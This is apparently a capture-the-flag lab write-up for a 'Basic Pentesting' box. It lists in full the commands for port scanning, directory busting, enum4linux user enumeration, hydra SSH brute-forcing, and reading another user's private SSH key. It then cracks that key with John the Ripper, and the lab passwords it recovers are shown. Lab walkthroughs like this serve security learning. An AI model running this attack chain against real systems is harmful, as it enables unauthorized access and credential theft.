# Table of Contents
- [Table of Contents](#table-of-contents)
- [Flow](#flow)
- [NMap](#nmap)
  - [Command](#command)
    - [Flags](#flags)
  - [Findings (Open Ports)](#findings-open-ports)
- [Browser](#browser)
  - [Findings](#findings)
- [DirBuster (GUI)](#dirbuster-gui)
  - [Flags / Options](#flags--options)
  - [Findings](#findings-1)
- [enum4linux](#enum4linux)
  - [Command](#command-1)
  - [Findings](#findings-2)
- [hydra (password guesser (bruteforce))](#hydra-password-guesser-bruteforce)
  - [Flags](#flags-1)
  - [Findings](#findings-3)
- [SMB](#smb)
  - [Command](#command-2)
  - [Findings](#findings-4)
- [linpeas](#linpeas)
  - [Commands](#commands)
  - [Findings](#findings-5)
- [SSH](#ssh)
  - [Findings](#findings-6)
- [John the Ripper](#john-the-ripper)
  - [Commands](#commands-1)
  - [Findings](#findings-7)

# Flow

<img src="flow.drawio.svg" height="500" />


# NMap
Use nmap to scan open ports of the target host.
## Command

<details>
<pre>sudo nmap -vvv -p- -sS -A -T4 -oN ~/Boxes/HTB/Basic\ Pentesting/nmap.log 10.10.183.193`</pre>

### Flags
-vvv: verbosity level 3\
-p-: all ports\
-sS: stealth scan (stealthy sync packet based scan)\
-A: Enable OS detection, version detection, script scanning, and traceroute
-T4: Set timing template (higher is faster) {0-5}\
-oN: output: normal
</details></br>

## Findings (Open Ports)
| Port | Service       | Details       | Note                                     |
| ---- | ------------- | ------------- | ---------------------------------------- |
| 22   | SSH           |
| 80   | http          | Apache/2.4.18 | hosts web page                           |
| 139  | SMB           |               | legacy - via NetBIOS                     |
| 445  | SMB (via TCP) |               | modern - via TCP - e.g. for file sharing |
| 8009 | ajp13         | Apache Jserv  |
| 8080 | http          | tomcat/9.0.7  |

# Browser
Vied target IP in browser. Says "Under maintenance, view dev logs". Tried some random routes - nothing.

## Findings
Error msg indicates:
- Apache/2.4.18 (Ubuntu) Server

# DirBuster (GUI)
Use DirBuster to find hidden directories and files.

## Flags / Options

<details>
<uk><li>Work Method: Use GET requests only (is faster)
<li>Use word list 
</ul></details></br>

## Findings
Found dirs:
- /development (with dev logs)
  - /dev.txt: Mentioned struts 2.5.12 (with remote code exe vulnerability)
  - /j.txt: Mentioned weak credentials

# enum4linux
Try to find users with enum4linux.

## Command
<details>
<pre>
enum4linux -a {IP-Address} | tee enum4linux.log
</pre>
</details></br>

## Findings
- Found 2 users: kay & jan

# hydra (password guesser (bruteforce))
Use hydra and rockyou wordlist to  get jan's password.

<details>
<pre>
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://{IP-Address} 
</pre>

## Flags
-l: Username\
-P: wordlist\
(-t: number of parallel tasks) 
</details></br>

## Findings
Found user: 
- login: jan 
- password: armando 

# SMB 
Anonymous access is open, no password required. Lets sniff around a bit.

## Command
<details>
<pre>
smbclient //{IP-Address}/anonymous
</pre>
<code>?</code> : list available commands</br>
<code>l</code> : list </br>
<code>get staff.txt {target path}</code> : transfer file to local host</br>
</details></br>

## Findings
- Found "staff.txt" file - says not to upload non-work-related items

# linpeas
Use linpeas injected via ssh with jan's account gained password to find privilege escalation paths.

## Commands
<details>
Use scp to transfer linpeas.sh to target 
<pre>scp /usr/share/peass/linpeas/linpeas.sh jan@{IP-Address}:{target path}</pre>
and then ssh into target execute the script with
<pre>./linpeas.sh | teee linlog.txt</pre>
</details></br>

## Findings
Found readable: /home/kay/.ssh/id_rsa

# SSH 
Use Jan's ssh credentials to sniff around.

<details>
<ul>
<li><code>cat /home/kay/.ssh/id_rsa</code> and copy it </br>
<li>on local host <code>nano kay_id_rsa</code> paste and save the file
</ul></details></br>

## Findings
Found Kay's private ssh keys (id_rsa)

# John the Ripper
Use John the Ripper to find Kays password from is private key.
## Commands
<details>
<ul>
<li>Run <code>ssh2john kay_id_rsa > john4kay.txt</code> to decrypt the private key to a text file readable by John
<li>Run <code>john john4kay.txt --wordlist=/usr/share/wordlists/rockyou.txt</code> to reveal the ssh password ("beeswax")
<li>use the ssh password and the id_rsa file to login via ssh as kay <code>ssh -i kay_id_rsa kay@{IP-Address}</code> 
<li><code>ls</code> in kay's home dir shows a <code>pass.back</code> file 
<li><code>cat pass.bak</code> reveals his password ("heresareallystrongpasswordthatfollowsthepasswordpolicy$$")
<ul></Details></br>

## Findings
kay's password





